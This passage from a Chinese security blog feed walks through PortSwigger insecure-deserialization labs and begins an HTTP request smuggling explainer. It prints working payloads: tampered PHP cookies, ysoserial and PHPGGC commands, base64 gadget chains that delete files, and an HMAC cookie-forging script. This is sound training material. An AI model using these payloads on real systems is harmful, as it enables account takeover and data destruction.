<p><img src="https://image.3001.net/images/20200904/15992123826652.png" alt="image-20200902172456250"></p>
<p>​    选择相应的监听器和Session</p>
<p><img src="https://image.3001.net/images/20200904/15992123854270.png" alt="image-20200902172655309"></p>
<p>​    成功连上</p>
<p><img src="https://image.3001.net/images/20200904/15992123887276.png" alt="image-20200902172721638"></p>
<p><img src="https://image.3001.net/images/20200904/15992123909334.png" alt=""></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器端模板注入（SSTI）</title>
    <url>/2020/08/16/SSTI/</url>
    <content><![CDATA[<p>​    最近做ctf时遇到一个模板注入的题，才想到以前都是直接在网上找payload，并没有仔细研究过ssti。本文从几个方面来细说ssti并应用实例来加深理解。</p>
<p><img src="https://image.3001.net/images/20200815/15974899849103.png" alt="image-20200728151739501"></p>
<a id="more"></a>    

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; &#125;&#125;</span><br><span class="line">&#123;% %&#125;</span><br></pre></td></tr></table></figure>

<p>​    由于Markdown 文档中的上述标签与 nunjucks 模板引擎的标签发生了冲突。上述标签等这些标签都是模板引擎的占位标签，如果 MarkDown 文档中包含这些标签，那么解析时就会把 MD 文档中的标签动态解析了，于是导致 MD 文档解析时报错。</p>
<p>文章发表在freebuf上，url：<a href="https://www.freebuf.com/articles/web/246832.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/246832.html</a></p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>不安全的序列化</title>
    <url>/2020/07/21/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>​    该漏洞的原因出自于如果应用对不可信的数据，例如恶意构造的用户输入进行反序列化，从而产生非预期的对象，从而有可能产生远程代码执行。</p>
<p><img src="https://image.3001.net/images/20200721/15953179408108.png" alt="image-20200719141510301"></p>
<a id="more"></a>

<h2 id="1-什么是序列化？"><a href="#1-什么是序列化？" class="headerlink" title="1. 什么是序列化？"></a>1. 什么是序列化？</h2><p>​    <strong>序列化</strong>是将复杂的数据结构（例如对象及其字段）转换为“更扁平”格式的过程，该格式可以作为字节顺序流发送和接收。序列化数据使其更容易：</p>
<ul>
<li>将复杂数据写入进程间内存，文件或数据库</li>
<li>例如，通过网络，在应用程序的不同组件之间或在API调用中发送复杂的数据</li>
</ul>
<p>​    至关重要的是，在序列化对象时，其状态也将保留下来。换句话说，将保留对象的属性及其分配的值。</p>
<h2 id="2-序列化与反序列化"><a href="#2-序列化与反序列化" class="headerlink" title="2.序列化与反序列化"></a>2.序列化与反序列化</h2><p>​    <strong>反序列化</strong>是将字节流还原为原始对象的完整功能副本的过程，其状态与序列化时的状态完全相同。然后，网站的逻辑可以与此反序列化的对象进行交互，就像与任何其他对象进行交互一样。</p>
<h2 id="3-什么是不安全的反序列化？"><a href="#3-什么是不安全的反序列化？" class="headerlink" title="3. 什么是不安全的反序列化？"></a>3. 什么是不安全的反序列化？</h2><p>​    不安全的反序列化是指网站对用户可控制的数据进行反序列化时。这可能使攻击者能够操纵序列化的对象，以将有害数据传递到应用程序代码中。</p>
<p>​    甚至有可能用完全不同类的对象替换序列化的对象。令人震惊的是，将对网站可用的任何类别的对象进行反序列化和实例化，而与预期的类别无关。因此，不安全的反序列化有时称为“对象注入”漏洞。</p>
<p>​    意外类的对象可能会导致异常。但是，到此时，损坏可能已经造成。许多基于反序列化的攻击是<strong>在</strong>反序列化完成<strong>之前</strong>完成的。这意味着即使网站本身的功能未与恶意对象直接交互，反序列化过程本身也可以发起攻击。因此，其逻辑基于强类型语言的网站也可能容易受到这些技术的攻击。</p>
<h2 id="4-不安全的反序列化漏洞如何产生？"><a href="#4-不安全的反序列化漏洞如何产生？" class="headerlink" title="4. 不安全的反序列化漏洞如何产生？"></a>4. 不安全的反序列化漏洞如何产生？</h2><p>​    由于通常认为反序列化对象是可信任的，因此也可能会出现漏洞。尤其是当使用具有二进制序列化格式的语言时，开发人员可能会认为用户无法有效读取或操纵数据。但是，尽管可能需要更多的精力，但攻击者有可能利用二进制序列化的对象，就像利用基于字符串的格式一样。</p>
<h2 id="5-不安全的反序列化有何影响？"><a href="#5-不安全的反序列化有何影响？" class="headerlink" title="5. 不安全的反序列化有何影响？"></a>5. 不安全的反序列化有何影响？</h2><p>​    不安全的反序列化的影响可能非常严重，因为它为大规模增加攻击面提供了切入点。它允许攻击者以有害的方式重用现有的应用程序代码，从而导致许多其他漏洞，通常是远程执行代码。</p>
<p>​    即使在无法执行远程代码的情况下，不安全的反序列化也可能导致特权升级，任意文件访问和拒绝服务攻击。</p>
<h2 id="6-利用不安全的反序列化漏洞"><a href="#6-利用不安全的反序列化漏洞" class="headerlink" title="6. 利用不安全的反序列化漏洞"></a>6. 利用不安全的反序列化漏洞</h2><h4 id="6-1-识别序列化"><a href="#6-1-识别序列化" class="headerlink" title="6.1 识别序列化"></a>6.1 识别序列化</h4><h5 id="6-1-1-PHP序列化格式"><a href="#6-1-1-PHP序列化格式" class="headerlink" title="6.1.1 PHP序列化格式"></a>6.1.1 PHP序列化格式</h5><p>​    PHP使用一种人类可读的字符串格式，其中字母代表数据类型，数字代表每个条目的长度。例如，考虑<code>User</code>具有以下属性的对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user-&gt;name &#x3D; &quot;carlos&quot;;</span><br><span class="line">$user-&gt;isLoggedIn &#x3D; true;</span><br></pre></td></tr></table></figure>

<p>​    序列化后，该对象可能看起来像这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;:s:6:&quot;carlos&quot;; s:10:&quot;isLoggedIn&quot;:b:1;&#125;</span><br></pre></td></tr></table></figure>

<p>​    可以解释如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot; -具有4个字符的类名称的对象 &quot;User&quot;</span><br><span class="line">2 -对象具有2个属性</span><br><span class="line">s:4:&quot;name&quot; -第一个属性的键是4个字符的字符串 &quot;name&quot;</span><br><span class="line">s:6:&quot;carlos&quot; -第一个属性的值是6个字符的字符串 &quot;carlos&quot;</span><br><span class="line">s:10:&quot;isLoggedIn&quot; -第二个属性的键是10个字符的字符串 &quot;isLoggedIn&quot;</span><br><span class="line">b:1 -第二个属性的值是布尔值 true</span><br></pre></td></tr></table></figure>

<p>​    PHP序列化的本机方法是<code>serialize()</code>和<code>unserialize()</code>。如果您具有源代码访问权限，则应从<code>unserialize()</code>代码中的任意位置开始并进行进一步调查。</p>
<h5 id="6-1-2-Java序列化格式"><a href="#6-1-2-Java序列化格式" class="headerlink" title="6.1.2 Java序列化格式"></a>6.1.2 Java序列化格式</h5><p>​    某些语言（例如Java）使用二进制序列化格式。这更难以阅读，但是如果您知道如何识别一些明显的迹象，您仍然可以识别序列化的数据。例如，序列化的Java对象始终以相同的字节开头，这些字节的编码方式为十六进制和Base64。</p>
<p>​    任何实现该接口的类<code>java.io.Serializable</code>都可以序列化和反序列化。如果您具有源代码访问权限，请注意使用该<code>readObject()</code>方法的所有代码，该方法用于从中读取和反序列化数据<code>InputStream</code>。</p>
<h4 id="6-2-操作序列化对象"><a href="#6-2-操作序列化对象" class="headerlink" title="6.2 操作序列化对象"></a>6.2 操作序列化对象</h4><p>​    利用一些反序列化漏洞可以像更改序列化对象中的属性一样容易。随着对象状态的持久化，您可以研究序列化的数据以识别和编辑有趣的属性值。然后，您可以通过反序列化过程将恶意对象传递到网站中。这是基本反序列化利用的第一步。</p>
<p>​    广义上讲，在处理序列化对象时可以采用两种方法。您可以直接以对象的字节流形式对其进行编辑，也可以使用相应的语言编写简短的脚本来自己创建和序列化新对象。使用二进制序列化格式时，后一种方法通常更容易。</p>
<h5 id="6-2-1-修改对象属性"><a href="#6-2-1-修改对象属性" class="headerlink" title="6.2.1 修改对象属性"></a>6.2.1 修改对象属性</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects</a></p>
<p>​    登录账户后，重新刷新首页，抓包：</p>
<p><img src="https://image.3001.net/images/20200721/15953179514868.png" alt="image-20200720142625289"></p>
<p>​    可以看到cookie位置为base64加密后的数据，经过解码：</p>
<p><img src="https://image.3001.net/images/20200721/15953179535634.png" alt="image-20200720142718744"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:5:&quot;admin&quot;;b:0;&#125;</span><br></pre></td></tr></table></figure>

<p>​    得到一段序列化的数据，可以看到第二个字段为判断是否为admin，Boolean值为0，可以通过修改为1接着base64加密后重新发包。</p>
<p><img src="https://image.3001.net/images/20200721/15953179586739.png" alt="image-20200720143346469"></p>
<p>​    可以访问admin界面了</p>
<h5 id="6-2-2-修改数据类型"><a href="#6-2-2-修改数据类型" class="headerlink" title="6.2.2 修改数据类型"></a>6.2.2 修改数据类型</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types</a></p>
<p>​    同样登录账户，刷新主页抓包得到base64编码后的cookie值，解码后得：</p>
<p><img src="https://image.3001.net/images/20200721/15953179623145.png" alt="image-20200720144700225"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;AeVESwbLNxZqqVmSo6z7qdj2aMzhfuTu&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>​    若要通过administrator账户登录，则需要通过修改序列化：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:13:&quot;administrator&quot;;s:12:&quot;access_token&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>

<p>​    首先修改第一个字段的用户名，记得s后面的字符串个数也要修改。其次修改后面的token值，通过php的弱类型比较的逻辑缺陷（比较字符串整数时：0 == “Example string” // true），把后面的字符串个数修改为整数个数为0。重新base64编码发包。</p>
<p><img src="https://image.3001.net/images/20200721/15953179671582.png" alt="image-20200720145854723"></p>
<h4 id="6-3-使用应用程序功能"><a href="#6-3-使用应用程序功能" class="headerlink" title="6.3 使用应用程序功能"></a>6.3 使用应用程序功能</h4><p>​    除了简单地检查属性值外，网站的功能还可能会对反序列化对象中的数据执行危险的操作。在这种情况下，您可以使用不安全的反序列化来传递意外数据，并利用相关功能造成损害。</p>
<p>​    例如，作为网站“删除用户”功能的一部分，通过访问<code>$user-&gt;image_location</code>属性中的文件路径来删除用户的个人资料图片。如果这<code>$user</code>是从序列化对象创建的，则攻击者可以通过将带有<code>image_location</code>集合的已修改对象传递到任意文件路径来利用此漏洞。删除他们自己的用户帐户也将删除此任意文件。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization</a></p>
<p>​    登录账户，点击我的账户中可以看到有个删除账户，抓包得到一个POST请求包，对cookie解码得：</p>
<p><img src="https://image.3001.net/images/20200721/15953179716311.png" alt="image-20200720154325150"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;93JrRRDWHKoJFprg7nQAe0BVGCYvx5RH&quot;;s:11:&quot;avatar_link&quot;;s:19:&quot;users&#x2F;wiener&#x2F;avatar&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>​    可以看到最后一个字段的值是一个文件路径，可以通过修改文件路径来进行任意文件的删除，经过修改序列化数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;93JrRRDWHKoJFprg7nQAe0BVGCYvx5RH&quot;;s:11:&quot;avatar_link&quot;;s:23:&quot;&#x2F;home&#x2F;carlos&#x2F;morale.txt&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>​    base64编码后重新发包，成功删除指定文件。</p>
<p><img src="https://image.3001.net/images/20200721/1595317981455.png" alt="image-20200720154859807"></p>
<h4 id="6-4-魔术方法"><a href="#6-4-魔术方法" class="headerlink" title="6.4 魔术方法"></a>6.4 魔术方法</h4><p>​    魔术方法已被广泛使用，它们本身并不表示漏洞。但是，当它们执行的代码处理攻击者可控制的数据（例如来自反序列化对象的数据）时，它们可能会变得危险。当满足相应条件时，攻击者可以利用它来自动对反序列化的数据调用方法。</p>
<h4 id="6-5-注入任意对象"><a href="#6-5-注入任意对象" class="headerlink" title="6.5 注入任意对象"></a>6.5 注入任意对象</h4><p>​    反序列化方法通常不会检查正在反序列化的内容。这意味着您可以传入网站可用的任何可序列化类的对象，并且该对象将被反序列化。这有效地使攻击者可以创建任意类的实例。该对象不是预期类的事实并不重要。意外的对象类型可能会导致应用程序逻辑中的异常，但是届时恶意对象将已经实例化。</p>
<p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php</a></p>
<p>​    在站点地图中，网站引用了文件<code>/libs/CustomTemplate.php</code>，文件名后加 ~ 字符查看源代码，进行代码审计。</p>
<p><img src="https://image.3001.net/images/20200721/15953179874947.png" alt="image-20200720164733193"></p>
<p>​    在源代码中，请注意<code>CustomTemplate</code>该类包含<code>__destruct()</code>魔法方法。这将调用属性<code>unlink()</code>上的方法<code>lock_file_path</code>，这将删除此路径上的文件。</p>
<p>​    通过构造序列化数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:14:&quot;CustomTemplate&quot;:1:&#123;s:14:&quot;lock_file_path&quot;;s:23:&quot;&#x2F;home&#x2F;carlos&#x2F;morale.txt&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>​    base64编码修改cookie重新发包，成功删除指定文件。</p>
<h4 id="6-6-Gadget链"><a href="#6-6-Gadget链" class="headerlink" title="6.6 Gadget链"></a>6.6 Gadget链</h4><p>​    “Gadget”是应用程序中存在的代码片段，可以帮助攻击者实现特定目标。单个Gadget可能不会直接对用户输入造成任何有害影响。但是，攻击者的目标可能只是调用一种方法，该方法会将其输入传递给另一个Gadget。通过以这种方式将多个Gadget链接在一起，攻击者可以潜在地将其输入传递到危险的“接收器Gadget”中，从而在其中造成最大的破坏。</p>
<p>​    重要的是要了解，与某些其他类型的利用不同，Gadget链不是攻击者构建的链接方法的有效负载。网站上已经存在所有代码。攻击者唯一控制的是传递到Gadget链中的数据。通常使用反序列化期间调用的魔术方法（有时称为“启动Gadget”）完成此操作。</p>
<h5 id="6-6-1-使用Apache-Commons开发Java反序列化"><a href="#6-6-1-使用Apache-Commons开发Java反序列化" class="headerlink" title="6.6.1 使用Apache Commons开发Java反序列化"></a>6.6.1 使用Apache Commons开发Java反序列化</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons</a></p>
<p>​    登录到您自己的帐户，观察会话cookie包含序列化的Java对象。向Burp Repeater发送包含会话cookie的请求。</p>
<p>​    下载“ ysoserial”工具并执行以下命令：<br><code>java -jar path/to/ysoserial.jar CommonsCollections4 &#39;rm /home/carlos/morale.txt&#39; | base64</code><br>​    这将生成一个包含有效负载的序列化对象，将会话cookie替换为刚创建的恶意cookie，并对整个字符串进行URL编码：</p>
<p><img src="https://image.3001.net/images/20200721/15953179929177.png" alt="image-20200720175610222"></p>
<h5 id="6-6-2-通过预建的Gadget链利用PHP反序列化"><a href="#6-6-2-通过预建的Gadget链利用PHP反序列化" class="headerlink" title="6.6.2 通过预建的Gadget链利用PHP反序列化"></a>6.6.2 通过预建的Gadget链利用PHP反序列化</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain</a></p>
<p>​    登录并观察cookie中的序列化数据，进行uel解码，包含使用SHA-1 HMAC哈希签名的会话令牌。Base64对令牌进行解码以发现它包含序列化的PHP对象。如果修改Cookie，则会引发异常，因为此数字签名不再匹配。还要注意内部服务器错误，该错误表明网站正在使用Symfony 4.3.6。</p>
<p>​    找到<code>/cgi-bin/phpinfo.php</code>文件中，存在泄露网站的<code>SECRET_KEY</code>：</p>
<p><img src="https://image.3001.net/images/20200721/15953179952046.png" alt="image-20200721145619238"></p>
<p>​    下载“ PHPGGC”工具并执行以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;phpggc Symfony&#x2F;RCE4 exec &#39;rm &#x2F;home&#x2F;carlos&#x2F;morale.txt&#39; | base64</span><br></pre></td></tr></table></figure>

<p>​    这将生成一个包含有效负载的序列化对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>​    创建一个包含恶意对象的有效的经过签名的cookie。您可以使用以下PHP脚本执行此操作。该<code>$object</code>是Base64编码刚刚生成的对象，<code>$secretKey</code>是从获得的<code>phpinfo.php</code>文件中的<code>SECRET_KEY</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $payload &#x3D; urlencode(&#39;&#123;&quot;token&quot;:&quot;&#39; . $object . &#39;&quot;,&quot;sig_hmac_sha1&quot;:&quot;&#39; . hash_hmac(&#39;sha1&#39;, $object, $secretKey) . &#39;&quot;&#125;&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200721/15953180009969.png" alt="image-20200721145935109"></p>
<p>​    修改cookie为生成的恶意cookie，重新发包，成功删除指定文件：</p>
<p><img src="https://image.3001.net/images/20200721/15953180039222.png" alt="image-20200721150254347"></p>
<h5 id="6-6-3-使用已记录的Gadget链开发Ruby反序列化"><a href="#6-6-3-使用已记录的Gadget链开发Ruby反序列化" class="headerlink" title="6.6.3 使用已记录的Gadget链开发Ruby反序列化"></a>6.6.3 使用已记录的Gadget链开发Ruby反序列化</h5><p>​    Lab地址：<a href="https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain" target="_blank" rel="noopener">https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain</a></p>
<p>​    登录账户，抓包base64解码查看cookie包含序列化的Ruby对象，查找Luke Jahnke撰写的“ Ruby 2.x Universal RCE Gadget Chain”。复制用于生成有效负载的脚本，然后将应执行的命令从<code>id</code>更改为<code>rm /home/carlos/morale.txt</code>并运行脚本。这将生成一个包含有效负载的序列化对象。输出包含对象的十六进制和Base64编码版本。复制Base64编码的对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BAhVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0BzoLQHNwZWNzWwdvOh5HZW06OlNvdXJjZTo6U3BlY2lmaWNGaWxlBjoKQHNwZWNvOhtHZW06OlN0dWJTcGVjaWZpY2F0aW9uCDoRQGxvYWRlZF9mcm9tSSIlfHJtIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0IDE+JjIGOgZFVDoKQGRhdGEwOwkwbzsIADoRQGRldmVsb3BtZW50Rg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>​    同样需要url编码，修改cookie重新发包：</p>
<p><img src="https://image.3001.net/images/20200721/15953180076130.png" alt="image-20200721152950252"></p>
<h2 id="7-如何防止不安全的反序列化漏洞"><a href="#7-如何防止不安全的反序列化漏洞" class="headerlink" title="7. 如何防止不安全的反序列化漏洞"></a>7. 如何防止不安全的反序列化漏洞</h2><p>​    一般而言，除非绝对必要，否则应避免对用户输入进行反序列化。在许多情况下，它可能带来的利用的高度严重性以及防范这些利用的难度超过了收益。</p>
<p>​    如果确实需要对来自不受信任来源的数据进行反序列化，请采用可靠的措施以确保数据未被篡改。例如，您可以实施数字签名来检查数据的完整性。但是，请记住，<strong>在</strong>开始反序列化过程<strong>之前，</strong>必须进行任何检查。否则，它们几乎没有用。</p>
<p>​    如果可能，应避免完全使用通用的反序列化功能。这些方法的序列化数据包含原始对象的所有属性，包括可能包含敏感信息的私有字段。相反，您可以创建自己的特定于类的序列化方法，以便至少可以控制公开哪些字段。</p>
]]></content>
      <categories>
        <category>不安全的序列化</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>不安全的序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP请求走私</title>
    <url>/2020/07/16/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
    <content><![CDATA[<p>​    在这个网络环境下，前端服务器负责安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，并对每一个请求都进行响应。在这种情况下可以利用HTTP请求走私，将无法访问的请求走私给后端服务器以获得响应。</p>
<p><img src="https://image.3001.net/images/20200716/15949110707602.png" alt="image-20200714170553642"></p>
<a id="more"></a>

<p>​    最近系统性的学习了下HTTP请求走私，通过大佬的博客理论基础+靶机实操整理了如下：</p>
<h2 id="1、HTTP请求走私攻击会发生什么？"><a href="#1、HTTP请求走私攻击会发生什么？" class="headerlink" title="1、HTTP请求走私攻击会发生什么？"></a>1、HTTP请求走私攻击会发生什么？</h2><p>​    当今的Web应用程序经常在用户和最终的应用程序逻辑之间使用HTTP服务器链。用户将请求发送到前端服务器（有时称为负载平衡器或反向代理），并且此服务器将请求转发到一个或多个后端服务器。在现代的基于云的应用程序中，这种类型的架构变得越来越普遍，在某些情况下是不可避免的。</p>
<p>​    当前端服务器将HTTP请求转发到后端服务器时，它通常会通过同一后端网络连接发送多个请求，因为这样做效率更高且性能更高。该协议非常简单：HTTP请求一个接一个地发送，接收服务器解析HTTP请求标头以确定一个请求在哪里结束，下一个请求在哪里开始：</p>
<p><img src="https://image.3001.net/images/20200716/15949110762923.png" alt="image-20200714171040520"></p>
<p>​    在这种情况下，至关重要的是前端和后端系统就请求之间的边界达成一致。否则，攻击者可能会发送一个模棱两可的请求，该请求被前端和后端系统以不同的方式解释：</p>
<p><img src="https://image.3001.net/images/20200716/15949110806977.png" alt="image-20200714171100673"></p>
<p>​    在这里，攻击者使前端请求的一部分被后端服务器解释为下一个请求的开始。它实际上是在下一个请求之前，因此会干扰应用程序处理该请求的方式。这是请求走私攻击，可能会造成破坏性后果。</p>
<h2 id="2、HTTP请求走私漏洞如何产生？"><a href="#2、HTTP请求走私漏洞如何产生？" class="headerlink" title="2、HTTP请求走私漏洞如何产生？"></a>2、HTTP请求走私漏洞如何产生？</h2><p>​    大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。</p>
<p>​    该<code>Content-Length</code>头是直接的：它指定消息体的以字节为单位的长度。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">q&#x3D;smuggling</span><br></pre></td></tr></table></figure>

<p>​    该<code>Transfer-Encoding</code>首标可以被用于指定该消息体的用途分块编码。这意味着消息正文包含一个或多个数据块。每个块均由以字节为单位的块大小（以十六进制表示）组成，后跟换行符，然后是块内容。该消息以大小为零的块终止。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;search HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">q&#x3D;smuggling</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>​    由于HTTP规范提供了两种不同的方法来指定HTTP消息的长度，因此单个消息可能会同时使用这两种方法，从而使它们彼此冲突。HTTP规范试图通过指出如果<code>Content-Length</code>和<code>Transfer-Encoding</code>标头同时存在，<code>Content-Length</code>则应忽略标头来防止此问题。当仅使用一台服务器时，这足以避免歧义，但是当将两个或多个服务器链接在一起时，这并不能避免歧义。在这种情况下，可能由于两个原因而出现问题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">某些服务器不支持 Transfer-Encoding 请求中的标头。</span><br><span class="line">Transfer-Encoding 如果以某种方式混淆了标头，则可能会诱使 某些确实支持标头的服务器不对其进行处理。</span><br></pre></td></tr></table></figure>

<p>​    如果前端服务器和后端服务器相对于（可能是混淆的）<code>Transfer-Encoding</code> 标头而言行为不同，则它们可能在连续请求之间的边界上存在分歧，从而导致请求走私漏洞。</p>
<h2 id="3、HTTP请求走私类型"><a href="#3、HTTP请求走私类型" class="headerlink" title="3、HTTP请求走私类型"></a>3、HTTP请求走私类型</h2><h3 id="3-1-CL不为0的GET请求"><a href="#3-1-CL不为0的GET请求" class="headerlink" title="3.1 CL不为0的GET请求"></a>3.1 CL不为0的GET请求</h3><p>​    前端代理服务器允许GET请求携带请求体，但后端服务器不允许GET请求携带请求体，则后端服务器会忽略掉GET请求中的<code>Content-Length</code>，不进行处理，从而导致请求走私。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET &#x2F; secret HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>

<p>​    前端服务器收到该请求，通过读取<code>Content-Length</code>，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，它就认为这是收到了两个请求。</p>
<h3 id="3-2-CL-CL"><a href="#3-2-CL-CL" class="headerlink" title="3.2 CL-CL"></a>3.2 CL-CL</h3><p>​    假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端服务器按照第二个<code>Content-Length</code>的值进行处理。这样有可能引发请求走私。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>

<p>​    前端代理服务器获取的数据包长度为 8，将以上数据包完整转发至后端服务器，但后端服务器仅接收长度为7的数据包。因此读取前7个字符后，后端服务器认为本次请求已经读取完毕，然后返回响应。</p>
<p>​    但此时缓冲区仍留下一个a，对于后端服务器来讲，这个a是下一个请求的一部分，但没传输完毕。如果此时传来一个请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">HOST: test.com</span><br></pre></td></tr></table></figure>

<p>​    那么前端服务器和后端服务器将重用TCP连接，使后端实际接收的请求为：</p>
